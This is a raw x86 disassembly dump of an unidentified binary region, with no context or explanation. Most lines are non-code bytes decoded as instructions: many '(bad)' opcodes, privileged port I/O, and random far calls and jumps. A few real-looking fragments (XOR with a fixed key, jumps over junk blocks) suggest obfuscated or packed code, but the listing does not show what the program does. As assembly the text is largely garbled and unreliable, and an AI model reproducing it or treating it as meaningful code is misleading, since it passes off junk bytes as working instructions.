  415110:	(bad)  
  415111:	xor    eax,0xfa6cef4e
  415116:	mov    al,BYTE PTR cs:[ebx]
  415119:	pop    ss
  41511a:	ins    BYTE PTR es:[edi],dx
  41511b:	les    esi,FWORD PTR ds:0x7ee71fbe
  415121:	js     0x4150c9
  415123:	sub    ebx,DWORD PTR [ecx+0x63cba87d]
  415129:	push   eax
  41512a:	sub    dh,BYTE PTR [ebx]
  41512c:	push   edx
  41512d:	test   eax,0x3ff6e1cf
  415132:	dec    ebx
  415133:	cs sbb eax,0x2849bfc
  415139:	inc    ebx
  41513a:	sti    
  41513b:	(bad)  
  41513c:	std    
  41513d:	pop    esp
  41513e:	fadd   DWORD PTR [ecx+ecx*2-0x28]
  415142:	test   eax,0x924ec514
  415147:	lea    eax,[edx]
  415149:	pop    ebp
  41514a:	sti    
  41514b:	aaa    
  41514c:	aad    0xc6
  41514e:	mov    eax,0xe7ca94a0
  415153:	push   ebx
  415154:	pop    esi
  415155:	push   ds
  415156:	in     al,dx
  415157:	scas   eax,DWORD PTR es:[edi]
  415158:	push   0x6e2e5bf2
  41515d:	sub    eax,0x584ba0cd
  415162:	sub    eax,0x5fabcbab
  415167:	sub    eax,0xd1bb0ce8
  41516c:	arpl   WORD PTR [eax],si
  41516e:	or     esp,DWORD PTR [eax]
  415170:	mov    al,ds:0xf0ac0371
  415175:	in     al,0x3
  415177:	cmp    BYTE PTR [edi+0x51],0x89
  41517b:	dec    ecx
  41517c:	mov    ds:0xe02b91be,al
  415181:	mov    DWORD PTR [ebp-0x24],esp
  415184:	mov    eax,DWORD PTR [ebp-0x4]
  415187:	mov    ecx,0x7510855
  41518c:	xor    eax,ecx
  41518e:	mov    edx,0x32729c
  415193:	jmp    0x415477
  415198:	mov    edi,0x35df28be
  41519d:	jne    0x4151f6
  41519f:	pop    esi
  4151a0:	push   ebx
  4151a2:	(bad)  
  4151a3:	fstp   DWORD PTR ds:0xed2870f1
  4151a9:	add    eax,0x7eb9707f
  4151ae:	jo     0x415220
  4151b0:	sbb    dh,BYTE PTR [edi+0xe3fd571]
  4151b6:	push   edx
  4151b7:	fs (bad) 
  4151b9:	xlat   BYTE PTR ds:[ebx]
  4151ba:	stos   DWORD PTR es:[edi],eax
  4151bb:	sar    BYTE PTR [esi+0xd],0xd2
  4151bf:	stos   DWORD PTR es:[edi],eax
  4151c0:	jecxz  0x4151b6
  4151c2:	imul   edi,ecx,0x3a
  4151c5:	and    esi,DWORD PTR [eax-0x3cac74fd]
  4151cb:	loop   0x4151af
  4151cd:	jge    0x415208
  4151cf:	sub    esp,ecx
  4151d1:	adc    eax,0x421a6d1e
  4151d6:	add    esi,esp
  4151d8:	ins    DWORD PTR es:[edi],dx
  4151d9:	or     BYTE PTR [ebp-0x75],0x1a
  4151dd:	enter  0x5ea8,0x20
  4151e1:	pop    ecx
  4151e2:	push   es
  4151e3:	test   BYTE PTR [eax-0x25d9f812],0xd2
  4151ea:	out    0x3a,eax
  4151ec:	xchg   ecx,eax
  4151ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4151ee:	fist   WORD PTR [ebx]
  4151f0:	push   eax
  4151f1:	bound  edi,QWORD PTR ds:0x3686a181
  4151f7:	mov    bh,0x16
  4151f9:	je     0x41522d
  4151fb:	in     al,0xf
  4151fd:	push   ds
  4151fe:	adc    BYTE PTR [edx-0x79e45470],ch
  415204:	xchg   esi,eax
  415205:	push   cs
  415206:	repnz dec ebx
  415208:	out    dx,al
  415209:	push   ss
  41520a:	outs   dx,BYTE PTR ds:[esi]
  41520b:	(bad)  
  41520c:	int    0x35
  41520e:	cmp    al,0x9
  415210:	mov    eax,0xabfc62b3
  415215:	mov    esp,0xe9464e8a
  41521a:	ja     0x4151dc
  41521c:	lock rcr al,1
  41521f:	leave  
  415220:	mov    BYTE PTR [edi+0x2fd44716],dh
  415226:	jmp    0x4151cd
  415228:	sbb    eax,0x382aece0
  41522d:	daa    
  41522e:	lock push edi
  415230:	lods   eax,DWORD PTR ds:[esi]
  415231:	add    eax,0xb7549b10
  415236:	test   BYTE PTR [edx-0x72],0x52
  41523a:	inc    edi
  41523b:	(bad)  
  41523c:	les    ecx,FWORD PTR [edx+0x5c8be4b6]
  415242:	mov    ds:0x86c47eb7,eax
  415247:	dec    ecx
  415248:	stc    
  415249:	jl     0x415249
  41524b:	(bad)  
  41524c:	and    al,0xf8
  41524e:	xchg   ebp,eax
  41524f:	add    DWORD PTR [ebp+0x51b27eee],ebx
  415255:	icebp  
  415256:	cmp    ebx,DWORD PTR [ebx+0x68c89996]
  41525c:	xor    DWORD PTR [ebx],esp
  41525e:	and    edx,DWORD PTR [ecx+0x5f593586]
  415264:	mov    ebp,0x6be05917
  415269:	std    
  41526a:	xchg   ebx,eax
  41526b:	and    ecx,DWORD PTR [ebp-0x41]
  41526e:	std    
  41526f:	xchg   esi,eax
  415270:	or     BYTE PTR [ebp+0x351381d1],bh
  415276:	dec    ebp
  415277:	xor    al,0x51
  415279:	mov    ch,0x72
  41527b:	push   ecx
  41527c:	push   ss
  41527d:	lods   eax,DWORD PTR ds:[esi]
  41527e:	int    0x5a
  415280:	jne    0x4152ef
  415282:	or     ch,al
  415284:	or     al,0x20
  415286:	dec    edi
  415287:	js     0x415238
  415289:	dec    esi
  41528a:	dec    edi
  41528b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41528c:	push   0xffffff8e
  41528e:	adc    al,0x3d
  415290:	pop    ebx
  415291:	mov    cl,0xbb
  415293:	loop   0x4152b9
  415295:	mov    ebx,0xa096fe6d
  41529a:	lods   eax,DWORD PTR ds:[esi]
  41529b:	lods   al,BYTE PTR ds:[esi]
  41529c:	pop    esi
  41529d:	stos   DWORD PTR es:[edi],eax
  41529e:	sub    bl,dl
  4152a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4152a1:	push   0xf715de9a
  4152a6:	je     0x4152ee
  4152a8:	shr    BYTE PTR [ecx+ecx*1+0x18655243],1
  4152af:	cs push 0x4d29c3a7
  4152b5:	push   edx
  4152b6:	and    DWORD PTR ds:0xf835a6d2,esp
  4152bc:	aam    0x96
  4152be:	sbb    bl,ch
  4152c0:	in     al,0x19
  4152c2:	lods   al,BYTE PTR ds:[esi]
  4152c3:	cmp    ebx,DWORD PTR [ebx-0x1c09990d]
  4152c9:	jg     0x4152ec
  4152cb:	mul    ebx
  4152cd:	add    eax,ecx
  4152cf:	in     al,dx
  4152d0:	push   esp
  4152d1:	(bad)  
  4152d2:	retf   
  4152d3:	retf   
  4152d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4152d5:	int3   
  4152d6:	adc    esi,edi
  4152d8:	xor    DWORD PTR [ecx+0x1d655bba],ebx
  4152de:	je     0x4152ea
  4152e0:	adc    esp,edx
  4152e2:	dec    edx
  4152e3:	cmp    DWORD PTR [edx+ebx*4-0x4adfeac3],0xf8e75ce1
  4152ee:	in     al,dx
  4152ef:	dec    esi
  4152f0:	jne    0x4152e6
  4152f2:	idiv   BYTE PTR [ebp+ebp*1-0x1fa367a1]
  4152f9:	(bad)  
  4152fa:	sbb    eax,0x1b5d165c
  4152ff:	sbb    al,0x81
  415301:	fwait
  415302:	adc    BYTE PTR [esi+0x193c5068],ch
  415308:	int    0xc8
  41530a:	jge    0x4152e7
  41530c:	cmp    al,0xb7
  41530e:	out    0x34,al
  415310:	ret    
  415311:	or     DWORD PTR [ebx-0x80],0x177bea19
  415318:	xchg   esi,eax
  415319:	sahf   
  41531a:	das    
  41531b:	push   eax
  41531c:	mov    esi,0x80deaaf8
  415321:	fbld   TBYTE PTR [ebp+0x38]
  415324:	fnstcw WORD PTR [ebx-0x62f83fd9]
  41532a:	lea    eax,[ebp+0x35]
  41532d:	fisubr WORD PTR [esi+0x58]
  415330:	sbb    eax,0xf83010ee
  415335:	stos   BYTE PTR es:[edi],al
  415336:	cmp    bl,bh
  415338:	aas    
  415339:	xchg   esp,eax
  41533a:	mov    ebx,0xd6b7330b
  41533f:	push   cs
  415340:	(bad)  
  415341:	mov    al,0x1e
  415343:	call   0x60c09683
  415348:	test   eax,0x66eedded
  41534d:	mov    bh,0xa0
  41534f:	retf   
  415350:	aaa    
  415351:	repz add eax,0x332d4c8
  415357:	mov    BYTE PTR [edx-0x69b6de69],bh
  41535d:	adc    DWORD PTR ds:0xea2d5274,0x34
  415364:	jg     0x415301
  415366:	dec    ebx
  415367:	cwde   
  415368:	mov    dh,0xe1
  41536a:	mov    edi,0x516557ef
  41536f:	fwait
  415370:	nop
  415371:	fwait
  415372:	cmp    eax,0x89df53c6
  415377:	js     0x415375
  415379:	dec    ebp
  41537a:	push   edx
  41537b:	in     eax,0x69
  41537d:	pushf  
  41537e:	jb     0x415327
  415380:	xchg   edi,eax
  415381:	ret    0xe332
  415384:	mov    al,ds:0x2efcda9e
  415389:	fdiv   DWORD PTR [ebx]
  41538b:	pop    ebp
  41538c:	out    dx,eax
  41538d:	in     eax,0x65
  41538f:	add    eax,0x95c37e21
  415394:	mov    eax,DWORD PTR [ebx-0x33]
  415397:	(bad)  
  415398:	fidiv  DWORD PTR [edx]
  41539a:	or     BYTE PTR [esi-0x28],dl
  41539d:	adc    eax,0x24517754
  4153a2:	push   edx
  4153a3:	cmp    eax,0xceb29dd2
  4153a8:	cmp    al,BYTE PTR [edi+edi*2-0x51]
  4153ac:	outs   dx,BYTE PTR ds:[esi]
  4153ad:	add    esp,DWORD PTR [ecx-0x2525012b]
  4153b3:	pop    ds
  4153b4:	cmp    bh,dl
  4153b6:	iret   
  4153b7:	out    0xec,al
  4153b9:	jle    0x4153c4
  4153bb:	rcr    BYTE PTR [edi+0x1139f61d],1
  4153c1:	adc    ebp,0xffffffac
  4153c4:	push   edi
  4153c5:	test   ch,dh
  4153c7:	pusha  
  4153c8:	sti    
  4153c9:	(bad)  
  4153ca:	loope  0x415436
  4153cc:	ss retf 
  4153ce:	push   eax
  4153cf:	xchg   edi,eax
  4153d0:	fistp  QWORD PTR [edi]
  4153d2:	mov    al,0x97
  4153d4:	sbb    eax,0x6d499eac
  4153d9:	shr    BYTE PTR [ecx+edx*4+0x2dd6dc9c],cl
  4153e0:	jo     0x4153e9
  4153e2:	push   esp
  4153e3:	popa   
  4153e4:	adc    DWORD PTR [esi+edx*8],ebx
  4153e7:	push   es
  4153e8:	retf   
  4153e9:	pop    edx
  4153ea:	xchg   edi,eax
  4153eb:	push   eax
  4153ec:	mov    ah,0x22
  4153ee:	push   esi
  4153ef:	jb     0x415418
  4153f1:	retf   
  4153f2:	repnz scas eax,DWORD PTR es:[edi]
  4153f4:	in     eax,0xeb
  4153f6:	icebp  
  4153f7:	jno    0x415452
  4153f9:	push   cs
  4153fa:	mov    ds:0xc7c64b5e,eax
  4153ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415400:	cwde   
  415401:	xor    edi,DWORD PTR [edx+0x43377ad9]
  415407:	adc    esi,DWORD PTR [edi+0x6d52f2bf]
  41540d:	popa   
  41540e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41540f:	and    al,BYTE PTR [edi-0x4d]
  415412:	add    BYTE PTR [esi+0x14b9f6b9],dh
  415418:	pop    ebx
  415419:	mov    cl,cl
  41541b:	aaa    
  41541c:	out    0xbf,al
  41541e:	es dec eax
  415420:	fcomp  DWORD PTR [edi]
  415422:	xchg   BYTE PTR ds:0x472ca765,bh
  415428:	sbb    BYTE PTR [ebp+0x48],ch
  41542b:	adc    al,0xa3
  41542d:	push   ebx
  41542e:	adc    ecx,DWORD PTR [ecx+0x6a480fa6]
  415434:	adc    esi,DWORD PTR [ecx+0x12]
  415437:	mov    eax,ds:0x9513e8
  41543c:	mov    ds:0xad06cdd9,eax
  415441:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415442:	mov    bh,0x4a
  415444:	loope  0x4153f0
  415446:	ins    DWORD PTR es:[edi],dx
  415447:	in     al,0x47
  415449:	add    eax,0x2c5b3c5c
  41544e:	inc    ebx
  41544f:	cmp    al,0x32
  415451:	xchg   DWORD PTR [eax-0x4],edx
  415454:	push   eax
  415455:	jle    0x415471
  415457:	loop   0x415410
  415459:	ds jmp 0x1dc1dadc
  41545f:	cmp    al,0xa0
  415461:	pop    es
  415462:	pop    ebx
  415463:	in     eax,0x16
  415465:	in     al,0xb9
  415467:	xchg   DWORD PTR [ebx],edx
  415469:	cs lahf 
  41546b:	je     0x4154a4
  41546d:	mov    eax,DWORD PTR [ebx-0x14ff52db]
  415473:	and    BYTE PTR [ecx],0xea
  415476:	or     al,BYTE PTR [ebx]
  415478:	ret    0x4589
  41547b:	or     BYTE PTR [ebx-0x3ecc17bb],cl
  415481:	add    eax,edx
  415483:	mov    edx,DWORD PTR [ebp+0x14]
  415486:	imul   eax,DWORD PTR [edx]
  415489:	mov    edx,DWORD PTR [ebp-0x4]
  41548c:	xor    edx,ecx
  41548e:	mov    ecx,DWORD PTR [ebp+0x8]
  415491:	lea    ecx,[edx+ecx*1+0x32729c]
  415498:	cmp    ecx,eax
  41549a:	je     0x416385
  4154a0:	mov    edi,DWORD PTR [ebp-0x18]
  4154a3:	mov    eax,DWORD PTR [ebp+0x8]
  4154a6:	mov    edx,DWORD PTR [ebp+0x14]
  4154a9:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  4154ad:	mov    ecx,0x7510855
  4154b2:	xor    edx,edx
  4154b4:	xor    edi,ecx
  4154b6:	jmp    0x41579a
  4154bb:	sub    dh,cl
  4154bd:	sub    BYTE PTR [ecx+0x71b159f7],bl
  4154c3:	xchg   esi,edx
  4154c5:	push   ebx
  4154c6:	mov    ch,0x0
  4154c8:	adc    ch,BYTE PTR [esi+0x7f02362c]
  4154ce:	jo     0x415489
  4154d0:	jle    0x415542
  4154d2:	jo     0x415467
  4154d4:	or     BYTE PTR [edx-0x13],bh
  4154d7:	call   0x308f:0x7fc00021
  4154de:	ins    BYTE PTR es:[edi],dx
  4154df:	aad    0x56
  4154e1:	gs aaa 
  4154e3:	scas   al,BYTE PTR es:[edi]
  4154e4:	adc    BYTE PTR [eax],ch
  4154e6:	dec    ebp
  4154e7:	mov    ecx,0x6a448901
  4154ec:	add    al,0xb4
  4154ee:	adc    al,0x37
  4154f0:	rol    BYTE PTR [edi-0x72456d20],cl
  4154f6:	shl    bh,cl
  4154f8:	gs jne 0x415534
  4154fb:	jmp    0x4154b4
  4154fd:	retf   
  4154fe:	inc    edx
  4154ff:	outs   dx,DWORD PTR ds:[esi]
  415500:	in     al,dx
  415501:	fisub  DWORD PTR [esi+0xe]
  415504:	jno    0x4154e4
  415506:	lea    ebp,[esi+0x76bf8b24]
  41550c:	xor    DWORD PTR [edi+0x376dab1a],ebp
  415512:	in     eax,dx
  415513:	dec    ebp
  415514:	(bad)  
  415515:	loop   0x415497
  415517:	adc    ebx,DWORD PTR [edx+edx*1+0x40]
  41551b:	cmp    eax,0x544a2fa9
  415520:	fild   QWORD PTR [esi]
  415522:	inc    edi
  415523:	sub    al,0xbc
  415525:	sub    eax,0x75003220
  41552a:	popa   
  41552b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41552c:	test   DWORD PTR [esi+0x52],esp
  41552f:	lgs    ecx,FWORD PTR [eax+0x4e]
  415533:	dec    ecx
  415534:	retf   0xfbd0
  415537:	(bad)  
  415539:	push   ebx
  41553a:	ror    BYTE PTR [ecx],1
  41553c:	aad    0x52
  41553e:	pushf  
  41553f:	mov    ecx,0x2f761582
  415544:	mov    DWORD PTR [ebp+0x1],edx
  415547:	pop    ebp
  415548:	test   al,0x72
  41554a:	mov    edx,0x117e5a71
  41554f:	out    0xfb,eax
  415551:	mov    es,esi
  415553:	addr16 inc esp
  415555:	or     BYTE PTR [edi+0x3ab0b590],cl
  41555b:	lock dec eax
  41555d:	xchg   ebx,eax
  41555e:	out    0x7f,eax
  415560:	ins    DWORD PTR es:[edi],dx
  415561:	add    eax,0x82f961e1
  415566:	xchg   edi,eax
  415567:	jns    0x41552d
  415569:	ja     0x415502
  41556b:	aas    
  41556c:	xlat   BYTE PTR ds:[ebx]
  41556d:	loop   0x41552a
  41556f:	mov    ds:0x9570a799,al
  415574:	mov    esp,0xc95f9e02
  415579:	nop
  41557a:	into   
  41557b:	lods   al,BYTE PTR ds:[esi]
  41557c:	xchg   edi,eax
  41557d:	addr16 retf 
  41557f:	lods   eax,DWORD PTR ds:[esi]
  415580:	cmp    ch,ch
  415582:	adc    cl,ch
  415584:	dec    esp
  415585:	mov    es,WORD PTR [ebp-0x5fb4e517]
  41558b:	mov    ebp,0x6cfd4be2
  415590:	xchg   esi,eax
  415591:	xlat   BYTE PTR ds:[ebx]
  415592:	pop    edx
  415593:	mov    ch,0x63
  415595:	std    
  415596:	mov    ebx,0xa9b6c543
  41559b:	out    0x77,eax
  41559d:	add    DWORD PTR [ecx-0x158703a6],0x3c
  4155a4:	mov    eax,ds:0x586e5756
  4155a9:	aam    0x39
  4155ab:	out    0xa0,eax
  4155ad:	sub    bl,0xd5
  4155b0:	adc    BYTE PTR [esi+0x78530537],dh
  4155b6:	arpl   WORD PTR [ebx],di
  4155b8:	scas   eax,DWORD PTR es:[edi]
  4155b9:	pop    ebp
  4155ba:	push   cs
  4155bb:	cli    
  4155bc:	push   ebp
  4155bd:	sahf   
  4155be:	mov    ebp,0x761c6050
  4155c3:	aaa    
  4155c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4155c5:	adc    BYTE PTR [edi],al
  4155c7:	dec    esi
  4155c8:	push   ss
  4155c9:	sbb    eax,0xfe388c96
  4155ce:	daa    
  4155cf:	inc    edx
  4155d0:	pop    ss
  4155d1:	call   0x6dbb83f9
  4155d6:	aam    0x8b
  4155d8:	dec    esp
  4155d9:	fscale 
  4155db:	or     DWORD PTR ds:0x99762fb3,edi
  4155e1:	iret   
  4155e2:	lahf   
  4155e3:	fidiv  WORD PTR [esi+eax*8-0x47fd5052]
  4155ea:	and    al,0x99
  4155ec:	xchg   ebp,eax
  4155ed:	hlt    
  4155ee:	cmp    dh,BYTE PTR [esi-0x6c]
  4155f1:	shl    BYTE PTR [edx+0x37b00a4f],1
  4155f7:	pusha  
  4155f8:	iret   
  4155f9:	or     eax,0x5ebf8b9e
  4155fe:	int    0x65
  415600:	mov    ds:0xbb362fc4,eax
  415605:	and    DWORD PTR [ecx-0x20dca2],ebx
  41560b:	adc    BYTE PTR [edi],cl
  41560d:	pop    ebp
  41560e:	jno    0x41559c
  415610:	push   edi
  415611:	pop    es
  415612:	repnz and eax,0x753d0c27
  415618:	test   eax,0x3712ed65
  41561d:	sub    DWORD PTR [edi+0x40],ecx
  415620:	iret   
  415621:	pop    ecx
  415622:	xor    DWORD PTR ss:[edx-0x7f],esp
  415626:	cdq    
  415627:	inc    eax
  415628:	pop    DWORD PTR [edx]
  41562a:	xlat   BYTE PTR ds:[ebx]
  41562b:	stos   DWORD PTR es:[edi],eax
  41562c:	pop    ebp
  41562d:	in     eax,dx
  41562e:	mov    esi,0xdc53cc23
  415633:	clc    
  415634:	and    BYTE PTR [ecx-0x39f27226],cl
  41563a:	mov    gs:0xbbbeed40,al
  415640:	dec    eax
  415641:	pop    ebx
  415642:	inc    esp
  415643:	mov    ah,0xb2
  415645:	call   0xc9f3b149
  41564a:	hlt    
  41564b:	leave  
  41564c:	std    
  41564d:	mov    DWORD PTR [esi+0x3cf7c6c],ecx
  415653:	popf   
  415654:	out    0xc7,eax
  415656:	xchg   esp,eax
  415657:	aam    0x46
  415659:	gs xchg ecx,eax
  41565b:	adc    al,0x24
  41565d:	out    dx,al
  41565e:	outs   dx,BYTE PTR ds:[esi]
  41565f:	xchg   ebx,eax
  415660:	shr    BYTE PTR [edi],0xc6
  415663:	das    
  415664:	scas   al,BYTE PTR es:[edi]
  415665:	xchg   ecx,eax
  415666:	pusha  
  415667:	pop    eax
  415668:	das    
  415669:	sbb    ch,al
  41566b:	mov    ?,ecx
  41566d:	inc    esi
  41566e:	pop    ds
  41566f:	dec    edx
  415670:	and    esi,DWORD PTR [edx+0x512e58c]
  415676:	cmp    edi,esp
  415678:	dec    esi
  415679:	das    
  41567a:	pop    esp
  41567b:	adc    al,ch
  41567d:	push   0xf5d18d45
  415682:	call   0xe888:0xd8d7ed99
  415689:	adc    eax,0x9989ec96
  41568e:	and    bl,BYTE PTR [ebx+0x79]
  415691:	test   al,0xeb
  415693:	dec    esi
  415694:	ins    BYTE PTR es:[edi],dx
  415695:	shr    DWORD PTR [ebp+0x6e5ddfa],1
  41569b:	mov    eax,ds:0xb1d997fc
  4156a0:	jecxz  0x4156df
  4156a2:	push   0xfffffffe
  4156a4:	pop    ds
  4156a5:	(bad)  
  4156a6:	push   eax
  4156a7:	xlat   BYTE PTR ds:[ebx]
  4156a8:	rcl    al,cl
  4156aa:	push   edi
  4156ab:	dec    esi
  4156ac:	frstor [ecx+0x55c6337d]
  4156b2:	xchg   ebx,eax
  4156b3:	jle    0x4156fe
  4156b5:	xor    al,0x8c
  4156b7:	(bad)  [edx+0x136443bc]
  4156bd:	jnp    0x41568b
  4156bf:	or     ecx,DWORD PTR [ecx+0x57e71c57]
  4156c5:	sub    cl,BYTE PTR [edx-0x450e34d1]
  4156cb:	mov    bh,0x26
  4156cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4156ce:	mov    dl,0x75
  4156d0:	sub    dh,BYTE PTR [esi+0x29]
  4156d3:	dec    esi
  4156d4:	cdq    
  4156d5:	pop    ebp
  4156d6:	or     BYTE PTR [edx-0x6366ea62],0x6d
  4156dd:	sub    dl,BYTE PTR [ebx-0x65]
  4156e0:	nop
  4156e1:	push   ss
  4156e2:	or     edx,DWORD PTR [edx]
  4156e4:	dec    esp
  4156e5:	and    dh,BYTE PTR [ecx]
  4156e7:	inc    esi
  4156e8:	push   edi
  4156e9:	sar    DWORD PTR ds:0x8c240263,cl
  4156ef:	jle    0x415731
  4156f1:	call   0xbf42ab1f
  4156f6:	xchg   esp,eax
  4156f7:	jbe    0x4156b2
  4156f9:	addr16 dec eax
  4156fb:	add    al,0x5e
  4156fd:	test   eax,0x5e53a5a6
  415702:	pop    ds
  415703:	sbb    DWORD PTR ds:0x7301039f,0xffffffcf
  41570a:	mov    ah,0x64
  41570c:	out    dx,al
  41570d:	dec    ecx
  41570e:	ror    DWORD PTR [ebx+0x8e799c8],0x6d
  415715:	jb     0x4156e1
  415717:	les    eax,FWORD PTR [ebx]
  415719:	std    
  41571a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41571b:	sbb    BYTE PTR [ebp+0x4b0d195c],ch
  415721:	enter  0x1035,0xc3
  415725:	cld    
  415726:	lods   al,BYTE PTR ds:[esi]
  415727:	sbb    ebp,DWORD PTR [ebx]
  415729:	lds    edi,FWORD PTR [edi+ebx*1+0x17d1ff9f]
  415730:	jbe    0x41573d
  415732:	retf   0x6f00
  415735:	out    dx,eax
  415736:	(bad)  
  415737:	sbb    al,0x15
  415739:	je     0x4156f7
  41573b:	pop    esi
  41573c:	daa    
  41573d:	sti    
  41573e:	clc    
  41573f:	xor    esp,DWORD PTR [ecx]
  415741:	push   ebp
  415742:	in     al,dx
  415743:	faddp  st(1),st
  415745:	xchg   DWORD PTR [ebx+0x5e],ebp
  415748:	push   ss
  415749:	ret    
  41574a:	lea    edx,[ebp-0x15]
  41574d:	pop    ds
  41574e:	mov    dl,0xbd
  415750:	test   DWORD PTR [edi],ebx
  415752:	add    eax,0xfe366ef5
  415757:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  415759:	push   ebp
  41575a:	add    ah,BYTE PTR [edi+0x17]
  41575d:	adc    ah,BYTE PTR [edx]
  41575f:	push   ecx
  415760:	int    0xbe
  415762:	in     al,0xac
  415764:	(bad)  
  415765:	adc    ah,dl
  415767:	mov    bh,0x73
  415769:	push   0x5
  41576b:	retf   
  41576c:	pop    ebp
  41576d:	mov    ebp,0xe3a61f1c
  415772:	xchg   ah,bl
  415774:	or     dh,BYTE PTR [edx]
  415776:	and    BYTE PTR [ebx+0x72681ebf],dl
  41577c:	adc    BYTE PTR [esi-0x1a],ah
  41577f:	arpl   WORD PTR [esi+0x38],cx
  415782:	imul   esi,DWORD PTR [edx+0x6de59c48],0xfa85cc86
  41578c:	nop
  41578d:	pushf  
  41578e:	jmp    0x83ba:0x1ddd3fe1
  415795:	jp     0x4157b1
  415797:	inc    esp
  415798:	mov    di,WORD PTR [esi+0x32729c]
  41579f:	add    edi,esi
  4157a1:	div    edi
  4157a3:	mov    edx,DWORD PTR [ebp-0x4]
  4157a6:	jmp    0x415a8a
  4157ab:	adc    al,0xcd
  4157ad:	inc    esi
  4157ae:	rol    BYTE PTR [ecx+0x51],cl
  4157b1:	xchg   esp,eax
  4157b2:	int    0x7b
  4157b4:	rcl    DWORD PTR [esi],1
  4157b6:	test   bh,bh
  4157b8:	aad    0x36
  4157ba:	je     0x41583b
  4157bc:	movq   QWORD PTR [eax-0x47],mm6
  4157c0:	jle    0x415832
  4157c2:	jo     0x4157f4
  4157c4:	jmp    0x41579a
  4157c6:	adc    BYTE PTR [ebx-0x51e8b3d2],dl
  4157cc:	fsubr  QWORD PTR [ecx-0x7fa8f00e]
  4157d2:	dec    ecx
  4157d3:	mov    ebx,0x46cbfd60
  4157d8:	mov    WORD PTR [eax],?
  4157da:	not    BYTE PTR ds:0x7b1c4a1b
  4157e0:	push   ebx
  4157e1:	ret    
  4157e2:	sub    eax,0x59703199
  4157e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4157e8:	stc    
  4157e9:	(bad)  
  4157eb:	in     al,0xda
  4157ed:	imul   ebx,DWORD PTR [eax+ebp*1],0x1a
  4157f1:	jno    0x415818
  4157f3:	shr    edi,cl
  4157f5:	dec    edi
  4157f6:	pop    esp
  4157f7:	rol    bh,cl
  4157f9:	imul   ecx,DWORD PTR [edx-0x5a89b6fb],0x30
  415800:	imul   edx,ebp,0xd5795bb4
  415806:	cmp    al,BYTE PTR [edi-0x506ead19]
  41580c:	mov    edi,DWORD PTR [ecx+ebx*2-0x64]
  415810:	aad    0xa1
  415812:	out    0x50,eax
  415814:	dec    edi
  415815:	(bad)  
  415816:	div    ebx
  415818:	outs   dx,BYTE PTR ds:[esi]
  415819:	xor    eax,0xdc5ded3f
  41581e:	add    eax,0xd289218d
  415823:	mov    ds:0xa2b6e80f,al
  415828:	push   esi
  415829:	xor    DWORD PTR [edx],ebx
  41582b:	repz xor esi,eax
  41582e:	mov    esi,0xfd61af57
  415833:	sbb    al,0x23
  415835:	or     eax,0xb47a783e
  41583a:	cwde   
  41583b:	xor    bl,BYTE PTR [edx+0xd]
  41583e:	adc    eax,0xd17d1df0
  415843:	repnz loopne 0x415829
  415846:	xchg   BYTE PTR [esi+0x2f],dh
  415849:	xor    edx,ebp
  41584b:	cld    
  41584c:	and    ecx,DWORD PTR [ebp-0x69]
  41584f:	clc    
  415850:	mov    ds:0x96794a40,al
  415855:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415856:	test   BYTE PTR [ebx+0x7b4fe4d8],ch
  41585c:	inc    ecx
  41585d:	sub    ah,dl
  41585f:	call   0x9ed134d8
  415864:	fwait
  415865:	mov    bh,0x4d
  415867:	loopne 0x4157f1
  415869:	adc    eax,ebx
  41586b:	inc    esp
  41586c:	pop    eax
  41586d:	or     BYTE PTR [eax+0x64],ch
  415870:	push   0x34baa9d6
  415875:	test   DWORD PTR [ebp-0x45040c9b],0xefe7a621
  41587f:	mov    dl,0xb1
  415881:	fild   QWORD PTR [ebx+0x7645290a]
  415887:	dec    ecx
  415888:	stos   DWORD PTR es:[edi],eax
  415889:	(bad)  
  41588a:	(bad)  
  41588b:	gs aaa 
  41588d:	add    BYTE PTR [ebp+0x5ee812],al
  415893:	push   0x3d6046d2
  415898:	cmc    
  415899:	push   edi
  41589a:	arpl   WORD PTR [ebx-0x19cc7e0d],bp
  4158a0:	test   DWORD PTR [ebx+0x1a280779],0x29511c9d
  4158aa:	nop
  4158ab:	stc    
  4158ac:	test   BYTE PTR [ebx-0xb1a9836],dh
  4158b2:	int3   
  4158b3:	fsub   st(0),st
  4158b5:	mov    ch,0xe
  4158b7:	ja     0x4158bb
  4158b9:	xchg   DWORD PTR [ecx-0x779c329f],eax
  4158bf:	inc    DWORD PTR [edx]
  4158c1:	sub    al,0x60
  4158c3:	gs xchg esi,eax
  4158c5:	add    eax,DWORD PTR [ecx-0x3d390eaf]
  4158cb:	jmp    0x517d9518
  4158d0:	and    al,0x28
  4158d2:	fist   WORD PTR [ebp+0x522bbd29]
  4158d8:	out    0xc,eax
  4158da:	jecxz  0x4158bf
  4158dc:	mov    al,ds:0xe23c5153
  4158e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4158e2:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  4158e4:	adc    BYTE PTR [ecx-0x3b12d47a],0x8
  4158eb:	mov    bh,0xed
  4158ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4158ee:	mov    ch,0xed
  4158f0:	or     esi,esp
  4158f2:	test   al,0xc5
  4158f4:	int    0x9c
  4158f6:	push   ecx
  4158f7:	daa    
  4158f8:	(bad)  
  4158f9:	pusha  
  4158fa:	jmp    0x325f:0xcd794efb
  415901:	push   ss
  415902:	dec    ebp
  415903:	out    dx,al
  415904:	mov    edi,0x4d788998
  415909:	xchg   ecx,eax
  41590a:	mov    bh,0x7
  41590c:	neg    DWORD PTR [esp+ecx*4]
  41590f:	jne    0x415903
  415911:	test   eax,0xae47bd96
  415916:	jl     0x4158e5
  415918:	xchg   ebx,eax
  415919:	lock es test al,0xfb
